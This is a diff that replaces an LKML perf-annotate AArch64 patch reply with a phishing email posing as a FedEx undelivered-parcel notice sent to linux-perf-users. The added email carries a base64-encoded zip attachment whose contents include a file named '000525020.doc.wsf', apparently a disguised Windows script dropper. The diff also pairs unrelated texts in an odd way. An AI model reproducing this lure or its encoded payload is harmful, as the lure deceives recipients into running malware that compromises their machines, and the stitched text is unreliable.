@@ -1,185 +1,76 @@
-From: Ravi Bangoria <ravi.bangoria@linux.vnet.ibm.com>
-Subject: Re: [PATCH 2/2] perf annotate: AArch64 support
-Date: Sat, 3 Dec 2016 13:38:37 +0530
-Message-ID: <58427D85.1010705@linux.vnet.ibm.com>
-References: <20161130092344.012e18e3e623bea395162f95@arm.com>
+From: "FedEx International MailService" <everett.foley@azur2cv.org>
+Subject: Problem with parcel shipping, ID:000525020
+Date: Mon, 5 Dec 2016 04:59:39 +0100
+Message-ID: <ed404cd58400ec42eea96a1752eb61cc@azur2cv.org>
+Reply-To: "FedEx International MailService" <everett.foley@azur2cv.org>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
+Content-Type: multipart/mixed;
+        boundary="b1_7ae10c3f671e92bfdc093e09842ea17b"
 Content-Transfer-Encoding: 8bit
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <20161130092344.012e18e3e623bea395162f95@arm.com>
-Sender: linux-kernel-owner@vger.kernel.org
-To: Arnaldo Carvalho de Melo <acme@kernel.org>
-Cc: Kim Phillips <kim.phillips@arm.com>, Chris Ryder <chris.ryder@arm.com>, Pawel Moll <pawel.moll@arm.com>, Peter Zijlstra <peterz@infradead.org>, Ingo Molnar <mingo@redhat.com>, Alexander Shishkin <alexander.shishkin@linux.intel.com>, linux-perf-users@vger.kernel.org, Will Deacon <will.deacon@arm.com>, Mark Rutland <mark.rutland@arm.com>, linux-kernel@vger.kernel.org, Ravi Bangoria <ravi.bangoria@linux.vnet.ibm.com>
-List-Id: linux-perf-users.vger.kernel.org
+Return-path: <linux-perf-users-owner@vger.kernel.org>
+Received: from mout.kundenserver.de ([212.227.126.130]:59675 "EHLO
+        mout.kundenserver.de" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+        with ESMTP id S1751223AbcLEEQG (ORCPT
+        <rfc822;linux-perf-users@vger.kernel.org>);
+        Sun, 4 Dec 2016 23:16:06 -0500
+Sender: linux-perf-users-owner@vger.kernel.org
+List-ID: <linux-perf-users.vger.kernel.org>
+To: linux-perf-users@vger.kernel.org
 
-Hi,
+--b1_7ae10c3f671e92bfdc093e09842ea17b
+Content-Type: text/plain; charset=us-ascii
 
-Sorry, I replied little late. I see you already included patch in perf/core.
+Dear Customer,
 
-I've tested this patch on powerpc with perf.data and vmlinux shared by Kim.
-Looks good to me.
+Your parcel has arrived at December 04. Courier was unable to deliver the parcel to you.
+You can review complete details of your order in the find attached.
 
-You can add my Tested-by.
+Regards,
+Everett Foley,
+Sr. Station Agent.
 
--Ravi.
+
+--b1_7ae10c3f671e92bfdc093e09842ea17b
+Content-Type: application/zip; name="000525020.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=000525020.zip
+
+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
 
 
-On Wednesday 30 November 2016 08:53 PM, Kim Phillips wrote:
-> This is a regex converted version from the original:
->
-> 	https://lkml.org/lkml/2016/5/19/461
->
-> Add basic support to recognise AArch64 assembly. This allows perf to
-> identify AArch64 instructions that branch to other parts within the
-> same function, thereby properly annotating them.
->
-> Rebased onto new cross-arch annotation bits:
->
-> 	https://lkml.org/lkml/2016/11/25/546
->
-> Sample output:
->
-> security_file_permission  vmlinux
->   5.80 │    ← ret                                                            ▒
->        │70:   ldr    w0, [x21,#68]                                           ▒
->   4.44 │    ↓ tbnz   d0                                                      ▒
->        │      mov    w0, #0x24                       // #36                  ▒
->   1.37 │      ands   w0, w22, w0                                             ▒
->        │    ↑ b.eq   60                                                      ▒
->   1.37 │    ↓ tbnz   e4                                                      ▒
->        │      mov    w19, #0x20000                   // #131072              ▒
->   1.02 │    ↓ tbz    ec                                                      ▒
->        │90:┌─→ldr    x3, [x21,#24]                                           ▒
->   1.37 │   │  add    x21, x21, #0x10                                         ▒
->        │   │  mov    w2, w19                                                 ▒
->   1.02 │   │  mov    x0, x21                                                 ▒
->        │   │  mov    x1, x3                                                  ▒
->   1.71 │   │  ldr    x20, [x3,#48]                                           ▒
->        │   │→ bl     __fsnotify_parent                                       ▒
->   0.68 │   │↑ cbnz   60                                                      ▒
->        │   │  mov    x2, x21                                                 ▒
->   1.37 │   │  mov    w1, w19                                                 ▒
->        │   │  mov    x0, x20                                                 ▒
->   0.68 │   │  mov    w5, #0x0                        // #0                   ▒
->        │   │  mov    x4, #0x0                        // #0                   ▒
->   1.71 │   │  mov    w3, #0x1                        // #1                   ▒
->        │   │→ bl     fsnotify                                                ▒
->   1.37 │   │↑ b      60                                                      ▒
->        │d0:│  mov    w0, #0x0                        // #0                   ▒
->        │   │  ldp    x19, x20, [sp,#16]                                      ▒
->        │   │  ldp    x21, x22, [sp,#32]                                      ▒
->        │   │  ldp    x29, x30, [sp],#48                                      ▒
->        │   │← ret                                                            ▒
->        │e4:│  mov    w19, #0x10000                   // #65536               ▒
->        │   └──b      90                                                      ◆
->        │ec:   brk    #0x800                                                  ▒
-> Press 'h' for help on key bindings
->
-> Signed-off-by: Chris Ryder <chris.ryder@arm.com>
-> Signed-off-by: Kim Phillips <kim.phillips@arm.com>
-> Cc: Pawel Moll <pawel.moll@arm.com>
-> Cc: Peter Zijlstra <peterz@infradead.org>
-> Cc: Ingo Molnar <mingo@redhat.com>
-> Cc: Arnaldo Carvalho de Melo <acme@kernel.org>
-> Cc: Alexander Shishkin <alexander.shishkin@linux.intel.com>
-> Cc: linux-perf-users@vger.kernel.org
-> Cc: Will Deacon <will.deacon@arm.com>
-> Cc: Mark Rutland <mark.rutland@arm.com>
-> ---
->  tools/perf/arch/arm64/annotate/instructions.c | 62 +++++++++++++++++++++++++++
->  tools/perf/util/annotate.c                    |  5 +++
->  2 files changed, 67 insertions(+)
->  create mode 100644 tools/perf/arch/arm64/annotate/instructions.c
->
-> diff --git a/tools/perf/arch/arm64/annotate/instructions.c b/tools/perf/arch/arm64/annotate/instructions.c
-> new file mode 100644
-> index 0000000..44eafd6
-> --- /dev/null
-> +++ b/tools/perf/arch/arm64/annotate/instructions.c
-> @@ -0,0 +1,62 @@
-> +#include <sys/types.h>
-> +#include <regex.h>
-> +
-> +struct arm64_annotate {
-> +	regex_t call_insn,
-> +		jump_insn;
-> +};
-> +
-> +static struct ins_ops *arm64__associate_instruction_ops(struct arch *arch, const char *name)
-> +{
-> +	struct arm64_annotate *arm = arch->priv;
-> +	struct ins_ops *ops;
-> +	regmatch_t match[2];
-> +
-> +	if (!regexec(&arm->jump_insn, name, 2, match, 0))
-> +		ops = &jump_ops;
-> +	else if (!regexec(&arm->call_insn, name, 2, match, 0))
-> +		ops = &call_ops;
-> +	else if (!strcmp(name, "ret"))
-> +		ops = &ret_ops;
-> +	else
-> +		return NULL;
-> +
-> +	arch__associate_ins_ops(arch, name, ops);
-> +	return ops;
-> +}
-> +
-> +static int arm64__annotate_init(struct arch *arch)
-> +{
-> +	struct arm64_annotate *arm;
-> +	int err;
-> +
-> +	if (arch->initialized)
-> +		return 0;
-> +
-> +	arm = zalloc(sizeof(*arm));
-> +	if (!arm)
-> +		return -1;
-> +
-> +	/* bl, blr */
-> +	err = regcomp(&arm->call_insn, "^blr?$", REG_EXTENDED);
-> +	if (err)
-> +		goto out_free_arm;
-> +	/* b, b.cond, br, cbz/cbnz, tbz/tbnz */
-> +	err = regcomp(&arm->jump_insn, "^[ct]?br?\\.?(cc|cs|eq|ge|gt|hi|le|ls|lt|mi|ne|pl)?n?z?$",
-> +		      REG_EXTENDED);
-> +	if (err)
-> +		goto out_free_call;
-> +
-> +	arch->initialized = true;
-> +	arch->priv	  = arm;
-> +	arch->associate_instruction_ops   = arm64__associate_instruction_ops;
-> +	arch->objdump.comment_char	  = ';';
-> +	arch->objdump.skip_functions_char = '+';
-> +	return 0;
-> +
-> +out_free_call:
-> +	regfree(&arm->call_insn);
-> +out_free_arm:
-> +	free(arm);
-> +	return -1;
-> +}
-> diff --git a/tools/perf/util/annotate.c b/tools/perf/util/annotate.c
-> index 3e34ee0..76b8bbf 100644
-> --- a/tools/perf/util/annotate.c
-> +++ b/tools/perf/util/annotate.c
-> @@ -105,6 +105,7 @@ static int arch__associate_ins_ops(struct arch* arch, const char *name, struct i
->  }
->
->  #include "arch/arm/annotate/instructions.c"
-> +#include "arch/arm64/annotate/instructions.c"
->  #include "arch/x86/annotate/instructions.c"
->  #include "arch/powerpc/annotate/instructions.c"
->
-> @@ -114,6 +115,10 @@ static struct arch architectures[] = {
->  		.init = arm__annotate_init,
->  	},
->  	{
-> +		.name = "arm64",
-> +		.init = arm64__annotate_init,
-> +	},
-> +	{
->  		.name = "x86",
->  		.instructions = x86__instructions,
->  		.nr_instructions = ARRAY_SIZE(x86__instructions),
+--b1_7ae10c3f671e92bfdc093e09842ea17b--
